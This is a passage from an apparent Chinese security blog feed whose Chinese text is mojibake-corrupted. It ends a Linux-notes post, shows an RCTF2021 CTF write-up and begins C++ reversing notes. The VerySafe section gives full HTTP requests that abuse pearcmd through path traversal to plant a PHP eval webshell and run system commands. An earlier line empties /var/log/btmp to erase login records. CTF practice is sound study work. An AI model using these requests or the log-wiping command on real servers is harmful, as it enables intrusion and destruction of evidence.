#è¿˜æ˜¯ä¼˜å…ˆæŒæ¡è¿™ä¸ªå§ï¼Œå®è´¨æ˜¯è¯»å–/var/log/btmp <br>echo &gt; /var/log/btmp  æ¸…é™¤lastbå¯¹åº”çš„æ–‡ä»¶å†…å®¹<br></code></pre></td></tr></table></figure><h3 id="chattr"><a href="#chattr" class="headerlink" title="chattr"></a>chattr</h3><blockquote><p>ç”¨æ¥æ”¹å˜æ–‡ä»¶å±æ€§</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">å‚æ•°<br>-R é€’å½’å¤„ç†ï¼Œå°†æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åŠå­ç›®å½•ä¸€å¹¶å¤„ç†ã€‚<br>+&lt;å±æ€§&gt; å¼€å¯æ–‡ä»¶æˆ–ç›®å½•çš„è¯¥é¡¹å±æ€§ã€‚<br>-&lt;å±æ€§&gt; å…³é—­æ–‡ä»¶æˆ–ç›®å½•çš„è¯¥é¡¹å±æ€§ã€‚<br>=&lt;å±æ€§&gt; æŒ‡å®šæ–‡ä»¶æˆ–ç›®å½•çš„è¯¥é¡¹å±æ€§ã€‚<br>iï¼šä¸å¾—ä»»æ„æ›´åŠ¨æ–‡ä»¶æˆ–ç›®å½•ï¼›<br>sï¼šä¿å¯†æ€§åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ï¼›<br>aï¼šè®©æ–‡ä»¶æˆ–ç›®å½•ä»…ä¾›é™„åŠ ç”¨é€”<br><br>chattr +i /etc/my.cnf  #ç”¨chattrå‘½ä»¤é˜²æ­¢ç³»ç»Ÿä¸­æŸä¸ªå…³é”®æ–‡ä»¶è¢«ä¿®æ”¹<br>lsattr /etc/my.cnf  #æŸ¥çœ‹æ–‡ä»¶å±æ€§<br>chattr +a /var/log/message#æŸä¸ªæ–‡ä»¶åªèƒ½å¾€é‡Œé¢è¿½åŠ æ•°æ®ï¼Œä½†ä¸èƒ½åˆ é™¤ï¼Œé€‚ç”¨äºå„ç§æ—¥å¿—æ–‡ä»¶<br></code></pre></td></tr></table></figure><h3 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h3><p>å‡ ä¸ªä¸é”™çš„å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">set number     #æ˜¾ç¤ºè¡Œå·<br>set autoindent # è‡ªåŠ¨ç¼©è¿›<br>/value    #æœç´¢vlaueè¿™ä¸ªå­—ç¬¦ä¸² ä½¿ç”¨ nè¿›è¡Œä¸Šä¸‹åˆ‡æ¢<br>/value -c   #å¤§å°å†™ä¸æ•æ„Ÿæœç´¢<br><span class="hljs-meta">%</span><span class="bash">s/foo/bar/g  <span class="hljs-comment">#%å…¨å±€æ›¿æ¢ æŠŠ foo æ›¿æ¢ä¸ºbar</span></span>  <br>s/foo/bar/g  #æ›¿æ¢å½“å‰è¡Œçš„foo<br><span class="hljs-meta">%</span><span class="bash">s/$/123/    <span class="hljs-comment">#åœ¨æ¯ä¸€è¡Œçš„ç»“å°¾è¿½åŠ 123</span></span><br><span class="hljs-meta">%</span><span class="bash">s/^<span class="hljs-comment">#//      #åˆ æ¯ä¸€è¡Œå¼€å¤´çš„#</span></span><br></code></pre></td></tr></table></figure><p>å‚è€ƒå…¬ä¼—å·ï¼šå…¥é—¨å°ç«™</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>RCTF2021éƒ¨åˆ†å¤ç°</title>
    <link href="/2022/01/08/RCTF2021%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/01/08/RCTF2021%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="RCTF2021å¤ç°"><a href="#RCTF2021å¤ç°" class="headerlink" title="RCTF2021å¤ç°"></a>RCTF2021å¤ç°</h1><p>æ¥æºï¼š<a href="https://github.com/ccreater222/my-ctf-challenges/tree/master/RCTF2021/">https://github.com/ccreater222/my-ctf-challenges/tree/master/RCTF2021/</a></p><h2 id="VerySafe"><a href="#VerySafe" class="headerlink" title="VerySafe"></a>VerySafe</h2><p>è™½ç„¶ä½†æ˜¯ï¼Œå¤ç°æœ‰ç‚¹æ¶å¿ƒï¼Œç¯å¢ƒå•¥ä¹Ÿæ²¡æœ‰ï¼Œä¸å¾—ä¸å»çœ‹wp</p><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/ccreater222/my-ctf-challenges.git<br>cd /my-ctf-challenges/RCTF2021/VerySafe/docker/<br>docker-compose up -d<br></code></pre></td></tr></table></figure><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a><strong>å‰ç½®çŸ¥è¯†</strong></h3><h4 id="pearcmdå®ç°è£¸æ–‡ä»¶åŒ…å«"><a href="#pearcmdå®ç°è£¸æ–‡ä»¶åŒ…å«" class="headerlink" title="pearcmdå®ç°è£¸æ–‡ä»¶åŒ…å«"></a>pearcmdå®ç°è£¸æ–‡ä»¶åŒ…å«</h4><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li>PHP å¼€å¯register_argc_argv</li><li>PHPä»¥Serverçš„å½¢å¼è¿è¡Œ</li></ul><p>peclæ˜¯PHPä¸­ç”¨äºç®¡ç†æ‰©å±•è€Œä½¿ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œåœ¨Dockerä»»æ„ç‰ˆæœ¬é•œåƒä¸­ï¼Œpcel/pearéƒ½ä¼šè¢«é»˜è®¤å®‰è£…ï¼Œå®‰è£…çš„è·¯å¾„åœ¨<code>/usr/local/lib/php</code></p><p>å¦‚å›¾ï¼Œåœ¨æ‹–å–ä¸‹æ¥çš„é•œåƒä¸­å­˜åœ¨ pearcmd.php</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201081736563.png" alt="image-20220108173616492"></p><p>å¦‚æœè¿™æ˜¯PHPå¼€å¯äº† <code>register_argc_argv</code> è¿™ä¸ªé€‰é¡¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¼ å…¥çš„å‚æ•°å°†ä¼šè¢«å½“åšå‘½ä»¤è¡Œå‚æ•° argv</p><blockquote><p>RFC3875ä¸­è§„å®šï¼Œå¦‚æœquery-stringä¸­ä¸åŒ…å«æ²¡æœ‰ç¼–ç çš„=ï¼Œä¸”è¯·æ±‚æ˜¯GETæˆ–HEADï¼Œåˆ™query-stringéœ€è¦è¢«ä½œä¸ºå‘½ä»¤è¡Œå‚æ•°ã€‚ä½†PHPæ²¡æœ‰ä¸¥æ ¼æŒ‰ç…§RFCæ¥å¤„ç†ï¼Œå³ä½¿æˆ‘ä»¬ä¼ å…¥çš„query-stringåŒ…å«ç­‰å·ï¼Œä¹Ÿä»ä¼šè¢«èµ‹å€¼ç»™$_SERVER[â€˜argvâ€™]</p></blockquote><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201081755960.png" alt="image-20220108175527866"></p><p>æ¥ç€æˆ‘ä»¬æŸ¥çœ‹ <code>pearcmd.php</code> ï¼Œå‘ç°config-createå‚æ•°å¯ä»¥å¸®åŠ©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œä¸”å†…å®¹å¯æ§ï¼Œé‚£è¿™ä¸ªæ—¶å€™å°±å¯ä»¥å†™å…¥ä¸€ä¸ªshell</p><h3 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h3><p>æ„å»º</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /../usr/local/lib/php/peclcmd.php?+config-create+/tmp/&lt;?=eval($_POST[<span class="hljs-number">1</span>]);?&gt;/*+/tmp/qqqq.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: yourhost:<span class="hljs-number">54120</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4664</span>.<span class="hljs-number">45</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1054</span>.<span class="hljs-number">29</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b<span class="hljs-number">3</span>;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-GB;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">Connection</span>: close<br><br></code></pre></td></tr></table></figure><p>ç„¶å</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /../tmp/hello.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: yourhost:<span class="hljs-number">54120</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">22</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4664</span>.<span class="hljs-number">45</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1054</span>.<span class="hljs-number">29</span><br><span class="hljs-attribute">Origin</span>: yourhost<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b<span class="hljs-number">3</span>;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Referer</span>: http://yourhost/tmp/hello.php<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-GB;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">Connection</span>: close<br><br><span class="hljs-attribute">1</span>=system(&#x27;/readflag&#x27;);<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201081809313.png" alt="image-20220108180908218"></p><p>æˆåŠŸgetFlag</p><p>å…¶ä»–å¯åˆ©ç”¨çš„å‚æ•° installï¼Œdownload</p><h2 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h2><p>åˆ«çœ‹äº†ï¼Œæ²¡å¤ç°å‡ºæ¥</p><p>å…ˆçœ‹çœ‹nginx.conf</p><p>server {<br>    listen       80;<br>    listen  [::]:80;<br>    server_name  localhost;</p><div class="code-wrapper"><pre><code class="hljs">#access_log  /var/log/nginx/host.access.log  main;root   /var/www/html;location /admin &#123;    allow 127.0.0.1;   //adminé¡µé¢åªå…è®¸127.0.0.1çš„è¯·æ±‚    deny all;&#125;location / &#123;    index  index.php;    try_files $uri @phpfpm;  //çœ‹å¯»æ‰¾çš„$document.uriå­˜ä¸å­˜åœ¨ ä¸å­˜åœ¨æ‰¾@phpfpm è¿™é‡Œ$documentåœ¨ç¬¬äºŒè¡Œå®šä¹‰ä¸º /var/www/html&#125;#error_page  404              /404.html;# redirect server error pages to the static page /50x.html#error_page   500 502 503 504  /50x.html;location = /50x.html &#123;    root   /usr/share/nginx/html;&#125;# proxy the PHP scripts to Apache listening on 127.0.0.1:80##location ~ \.php$ &#123;#    proxy_pass   http://127.0.0.1;#&#125;# pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000#location @phpfpm &#123;    include        fastcgi_params;    fastcgi_split_path_info ^(.+?\.php)(/.*)$;    fastcgi_pass   php:9000;   //fastcgiæœåŠ¡ç«¯å£    fastcgi_index  index.php;  //fastcgié»˜è®¤çš„ä¸»é¡µèµ„æº    fastcgi_param  SCRIPT_FILENAME  $document_root/index.php;    fastcgi_param  REQUEST_URI  $uri;   //$uriè¯·æ±‚èµ„æºç»™ REQUEST_URI&#125;# deny access to .htaccess files, if Apache&#39;s document root# concurs with nginx&#39;s one##location ~ /\.ht &#123;#    deny  all;#&#125;</code></pre></div><p>index.php å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;flight/autoload.php&#x27;</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">flight</span>\<span class="hljs-title">Engine</span>;<br><span class="hljs-variable">$app</span> = <span class="hljs-keyword">new</span> Engine();<br><br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$password</span> = uniqid(<span class="hljs-string">&quot;asdfsadf&quot;</span>,<span class="hljs-literal">true</span>).<span class="hljs-string">&quot;YouWillNerveKnow&quot;</span>;<span class="hljs-comment">// you will never know the password å”¯ä¸€æ ‡è¯†ç¬¦</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isdanger</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123;  <span class="hljs-comment">//æ£€æµ‹å±é™©å‚æ•°</span><br>    <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$v</span>))&#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$v</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br>            <span class="hljs-keyword">if</span>(isdanger(<span class="hljs-variable">$k</span>)||isdanger(<span class="hljs-variable">$value</span>))&#123;  <span class="hljs-comment">//å¦‚æœä¼ å…¥æ•°ç»„ =&gt; </span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$v</span>,<span class="hljs-string">&quot;../&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;  <span class="hljs-comment">//å¦‚æœå­˜åœ¨ ../ =&gt; å±é™©</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-variable">$app</span>-&gt;before(<span class="hljs-string">&quot;start&quot;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">foreach</span>([<span class="hljs-variable">$_GET</span>,<span class="hljs-variable">$_POST</span>,<span class="hljs-variable">$_COOKIE</span>,<span class="hljs-variable">$_FILES</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>)&#123;<br>        <span class="hljs-keyword">if</span>(isdanger(<span class="hljs-variable">$value</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;go away hack&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;);<br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&#x27;/*&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$request</span> = <span class="hljs-variable">$app</span>-&gt;request();<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;head&quot;</span>,[],<span class="hljs-string">&quot;head_content&quot;</span>);<br>    <span class="hljs-keyword">if</span>(stristr(<span class="hljs-variable">$request</span>-&gt;url,<span class="hljs-string">&quot;login&quot;</span>)!==<span class="hljs-literal">FALSE</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>])&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-variable">$app</span>-&gt;redirect(<span class="hljs-string">&quot;/login&quot;</span>);<br>    &#125;<br><br>    <br>&#125;);<br><br><br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&#x27;/admin&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$request</span> = <span class="hljs-variable">$app</span>-&gt;request();<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;admin&quot;</span>,[<span class="hljs-string">&quot;data&quot;</span>=&gt;<span class="hljs-string">&quot;./&quot;</span>.<span class="hljs-variable">$request</span>-&gt;query-&gt;data],<span class="hljs-string">&quot;body_content&quot;</span>);<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;template&quot;</span>,[]);<br>&#125;);<br><br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&quot;GET /login&quot;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$request</span> = <span class="hljs-variable">$app</span>-&gt;request();<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;login&quot;</span>,[<span class="hljs-string">&quot;fail&quot;</span>=&gt;<span class="hljs-variable">$request</span>-&gt;query-&gt;fail],<span class="hljs-string">&quot;body_content&quot;</span>);<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;template&quot;</span>,[]);<br>&#125;);<br><br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&quot;POST /login&quot;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>,<span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$request</span>  = <span class="hljs-variable">$app</span>-&gt;request();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$request</span>-&gt;data-&gt;username === <span class="hljs-variable">$username</span> &amp;&amp; <span class="hljs-variable">$request</span>-&gt;data-&gt;password === <span class="hljs-variable">$password</span>)&#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable">$app</span>-&gt;redirect(<span class="hljs-string">&quot;/&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-variable">$app</span>-&gt;redirect(<span class="hljs-string">&quot;/login?fail=1&quot;</span>);<br>&#125;);<br><br><span class="hljs-variable">$app</span>-&gt;route(<span class="hljs-string">&quot;GET /&quot;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;index&quot;</span>,[],<span class="hljs-string">&quot;body_content&quot;</span>);<br>    <span class="hljs-variable">$app</span>-&gt;render(<span class="hljs-string">&quot;template&quot;</span>,[]);<br>&#125;);<br><br><span class="hljs-variable">$app</span>-&gt;start();<br></code></pre></td></tr></table></figure><p>æˆ‘å°±ç›´æ¥æš´èºï¼Œä¸æ‡‚åˆ«äººæ€ä¹ˆåšçš„äº†ï¼Œä¹Ÿè®¸æ˜¯ç›´æ¥ç»™æºç äº†ï¼Œæˆ‘è¿™é‡Œæ˜¯å•¥ä¹Ÿæ²¡æœ‰</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C++é€†å‘ç¬”è®°</title>
    <link href="/2022/01/07/C-%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/01/07/C-%E9%80%86%E5%90%91%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ä¿¡æ¯å®‰å…¨-C-é€†å‘"><a href="#ä¿¡æ¯å®‰å…¨-C-é€†å‘" class="headerlink" title="ä¿¡æ¯å®‰å…¨-C++é€†å‘"></a>ä¿¡æ¯å®‰å…¨-C++é€†å‘</h1><h2 id="åŸºç¡€"><a href="#åŸºç¡€" class="headerlink" title="åŸºç¡€"></a>åŸºç¡€</h2><h3 id="å­˜å‚¨å•ä½"><a href="#å­˜å‚¨å•ä½" class="headerlink" title="å­˜å‚¨å•ä½"></a>å­˜å‚¨å•ä½</h3><p>â€‹    bit     æœ€å°å•ä½ 0/1</p><p>â€‹    Byte  1Byte=8bit</p><p>â€‹    DWORD   1DWORD=2Byte</p><h3 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h3><h4 id="é€šç”¨å¯„å­˜å™¨"><a href="#é€šç”¨å¯„å­˜å™¨" class="headerlink" title="é€šç”¨å¯„å­˜å™¨"></a>é€šç”¨å¯„å­˜å™¨</h4><p>â€‹    eax    ç´¯åŠ å™¨å¯„å­˜å™¨ï¼Œç”¨äºè¿›è¡Œæ•°å­¦è¿ç®—ã€‚</p><p>â€‹    ebx    åŸºæ•°å¯„å­˜å™¨</p><p>â€‹    ecx    è®¡æ•°å™¨</p><p>â€‹    edx    æ•°æ®å¯„å­˜å™¨</p><p>â€‹    ESI    åŸåœ°å€å¯„å­˜å™¨</p><p>â€‹    EDI    ç›®çš„å¯„å­˜å™¨</p><p>â€‹    EBP    æ ˆåº•    </p><p>â€‹    ESP    æ ˆé¡¶</p><p>â€‹    EIP    æŒ‡ä»¤å¯„å­˜å™¨ï¼ŒEIPæŒ‡å‘ä¸‹ä¸€ä¸ªå°†ä¼šè¢«æ‰§è¡Œçš„æŒ‡ä»¤ã€‚</p><p>å¯„å­˜å™¨å¤§å°éƒ½æ˜¯32ä½ (å››ä¸ªå­—èŠ‚) ã€‚å®ƒä»¬å¯ä»¥å‚¨å­˜å€¼ä¸ºä»0-FFFFFFFF (æ— ç¬¦å·)çš„æ•°æ®</p><h4 id="æ®µå¯„å­˜å™¨"><a href="#æ®µå¯„å­˜å™¨" class="headerlink" title="æ®µå¯„å­˜å™¨"></a>æ®µå¯„å­˜å™¨</h4><ol><li>CS -&gt; â€˜code segmentâ€™(ä»£ç æ®µå¯„å­˜å™¨)ï¼šç”¨äºå­˜æ”¾åº”ç”¨ç¨‹åºä»£ç æ‰€åœ¨æ®µçš„æ®µåŸºå€(ä¹‹åä¼šè¯´æ˜)</li><li>DS -&gt; â€˜data segmentâ€™(æ•°æ®æ®µå¯„å­˜å™¨)ï¼šç”¨äºå­˜æ”¾æ•°æ®æ®µçš„æ®µåŸºå€(ä»¥åä¼šè¯´æ˜)</li><li>ES -&gt; â€˜extra segmentâ€™(é™„åŠ æ®µå¯„å­˜å™¨)ï¼šç”¨äºå­˜æ”¾ç¨‹åºä½¿ç”¨çš„é™„åŠ æ•°æ®æ®µçš„åŸºåœ°å€</li><li>SS -&gt; â€˜stack segmentâ€™(æ ˆæ®µå¯„å­˜å™¨)ï¼šç”¨äºå­˜æ”¾æ ˆæ®µçš„æ®µåŸºå€(ä»¥åä¼šè¯´æ˜)</li></ol><h4 id="æ ‡å¿—å¯„å­˜å™¨"><a href="#æ ‡å¿—å¯„å­˜å™¨" class="headerlink" title="æ ‡å¿—å¯„å­˜å™¨"></a>æ ‡å¿—å¯„å­˜å™¨</h4><p>ZFã€OFã€CF</p><p><strong>Z-Flag(é›¶æ ‡å¿—)ï¼š</strong></p><p>ZFæ˜¯ç ´è§£ä¸­ç”¨å¾—æœ€å¤šçš„å¯„å­˜å™¨(é€šå¸¸æƒ…å†µä¸‹å äº†90%)ï¼Œå®ƒå¯ä»¥è®¾æˆ0æˆ–è€…1ã€‚è‹¥ä¸Šä¸€ä¸ªè¿ç®—ç»“æœä¸º0ï¼Œåˆ™å…¶å€¼ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚(ä½ å¯èƒ½ä¼šé—®ä¸ºä»€ä¹ˆâ€˜CMPâ€™å¯ä»¥æ“ä½œZFå¯„å­˜å™¨ï¼Œè¿™æ˜¯å› 